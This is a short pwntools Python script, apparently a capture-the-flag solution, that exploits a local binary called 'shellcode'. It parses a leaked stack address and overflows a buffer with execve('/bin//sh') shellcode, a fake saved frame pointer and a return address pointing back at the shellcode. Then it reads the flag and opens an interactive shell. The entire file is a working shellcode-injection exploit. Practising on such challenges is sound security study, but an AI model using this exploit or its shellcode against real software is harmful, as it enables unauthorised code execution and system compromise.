#!/usr/bin/env python3

from pwn import *

TARGET = './shellcode'
context.arch = 'amd64'
elf = ELF(TARGET)
p = process(TARGET)

'''
gdb_script = f"""
  b *main
  c
"""
context.terminal = [
  'wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc'
]
p = gdb.debug(TARGET, gdbscript=gdb_script)

'''

# EXPLOIT #
p.recvuntil(b'at: ')
stack_leak = int(p.recvline()[:-1].strip(), 16)
print(f"stack address : {hex(stack_leak)}")

# shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

p.sendlineafter(b'Shellcode: ', shellcode.ljust(64, b'\x00') + p64(0xdeadbeef) + p64(stack_leak))
p.sendline(b'cat flag.txt')

p.interactive()